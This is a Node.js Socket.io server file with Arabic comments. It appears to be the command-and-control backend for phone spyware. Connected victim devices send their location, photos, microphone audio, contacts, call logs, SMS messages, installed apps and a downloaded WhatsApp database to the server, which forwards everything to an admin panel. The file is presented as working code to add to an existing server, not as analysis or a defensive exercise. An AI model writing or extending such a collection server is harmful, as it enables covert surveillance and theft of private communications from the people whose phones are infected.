// server.js (مقتطف/محدث) — لاحظ: استخدمه داخل سيرفرك الموجود (ابقَ على ما لديك من بقية الدوال)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET","POST"] } });

const port = process.env.PORT || 8080;
server.listen(port, () => console.log(`[LOG] Server running on ${port}`));

// in-memory stores (يمكن استبدالها بقاعدة بيانات لاحقاً)
const devices = {}; // id -> device object
const logs = [];

function addLog(msg){
  logs.push({ ts: Date.now(), msg });
  console.log('[LOG]', msg);
  if(logs.length>2000) logs.shift();
}

// Socket handlers
io.on('connection', (socket) => {
  addLog(`socket connected: ${socket.id}`);

  socket.on('adminJoin', () => {
    // send current devices snapshot
    Object.values(devices).forEach(d => socket.emit('join', d));
    addLog('admin joined ' + socket.id);
  });

  // device joins (client should emit 'join' with device info)
  socket.on('join', (payload) => {
    const id = payload.id || ('device_' + Math.floor(Math.random()*10000));
    const now = Date.now();
    const device = devices[id] || {};
    device.id = id;
    device.model = payload.model || payload.userAgent || device.model;
    device.language = payload.language || device.language;
    device.screen = payload.screen || device.screen;
    device.platform = payload.platform || device.platform;
    device.cookiesEnabled = payload.cookiesEnabled ?? device.cookiesEnabled;
    device.ip = payload.ip || device.ip || socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    device.socketId = socket.id;
    device.lastSeen = now;
    devices[id] = device;
    addLog(`device join: ${id} ip:${device.ip}`);
    // notify admins
    io.emit('join', device);
  });

  // store generic deviceInfo
  socket.on('deviceInfo', (payload) => {
    const id = payload.id;
    if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].extra = payload.extra || payload;
    devices[id].lastSeen = Date.now();
    addLog(`deviceInfo from ${id}`);
    io.emit('deviceInfo', { id, extra: devices[id].extra });
  });

  // battery
  socket.on('battery', (payload) => {
    const id = payload.id; 
    if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].battery = payload.data;
    devices[id].lastSeen = Date.now();
    addLog(`battery from ${id}: ${JSON.stringify(payload.data)}`);
    io.emit('battery', { id, data: payload.data });
  });

  // network info
  socket.on('networkInfo', (payload) => {
    const id = payload.id; if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].network = payload.data;
    devices[id].lastSeen = Date.now();
    addLog(`networkInfo from ${id}`);
    io.emit('networkInfo', { id, data: payload.data });
  });

  // location (client should send {id, data:{lat,lon,accuracy}})
  socket.on('getLocation', (payload) => {
    const id = payload.id; if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].lastLocation = payload.data;
    devices[id].lastSeen = Date.now();
    addLog(`location from ${id}: ${JSON.stringify(payload.data)}`);
    io.emit('getLocation', { id, data: payload.data });
  });

  // photo (base64)
  socket.on('photo', (payload) => {
    const id = payload.id; if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].lastPhoto = { ts: Date.now(), data: payload.data }; // data = base64 image data URL
    devices[id].lastSeen = Date.now();
    addLog(`photo received from ${id}`);
    io.emit('photo', { id, data: payload.data });
  });

  // audio (base64)
  socket.on('audio', (payload) => {
    const id = payload.id; if(!id) return;
    devices[id] = devices[id] || { id };
    devices[id].lastAudio = { ts: Date.now(), data: payload.data }; // data = base64 audio blob
    devices[id].lastSeen = Date.now();
    addLog(`audio received from ${id}`);
    io.emit('audio', { id, data: payload.data });
  });

  // other events like installed apps / contacts / sms — store if provided by client
  const otherEvents = ['getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
  otherEvents.forEach(ev => {
    socket.on(ev, (payload) => {
      const id = payload.id;
      if(!id) return;
      devices[id] = devices[id] || { id };
      devices[id][ev] = payload.data;
      devices[id].lastSeen = Date.now();
      addLog(`${ev} from ${id}`);
      io.emit(ev, { id, data: payload.data });
    });
  });

  socket.on('disconnect', (reason) => {
    addLog(`socket disconnected: ${socket.id} (${reason})`);
    // mark device as offline if matched
    for(const id in devices){
      if(devices[id].socketId === socket.id){
        devices[id].socketId = null;
        devices[id].lastSeen = Date.now();
        io.emit('disconnectClient', socket.id);
        addLog(`device ${id} disconnected`);
      }
    }
  });

}); // io.on
